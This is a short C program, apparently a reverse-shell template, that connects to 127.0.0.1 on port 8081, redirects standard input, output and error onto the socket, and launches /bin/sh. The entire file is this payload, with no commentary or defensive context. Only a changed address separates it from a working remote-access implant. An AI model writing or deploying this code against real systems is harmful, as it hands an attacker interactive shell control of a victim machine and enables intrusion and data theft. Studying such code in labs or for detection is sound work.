#include<stdio.h>
#include<unistd.h>
#include<netinet/in.h>
#include<sys/types.h>
#include<sys/socket.h>

int main(){
    int sock;
    int port = 8081;
    char ip_addr[] = "127.0.0.1";
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip_addr);

    sock = socket(AF_INET,SOCK_STREAM,0);

    connect(sock,(struct sockaddr *)&addr,sizeof(addr));

    dup2(sock,0);
    dup2(sock,1);
    dup2(sock,2);

    execve("/bin/sh",NULL,NULL);
    return 0;

}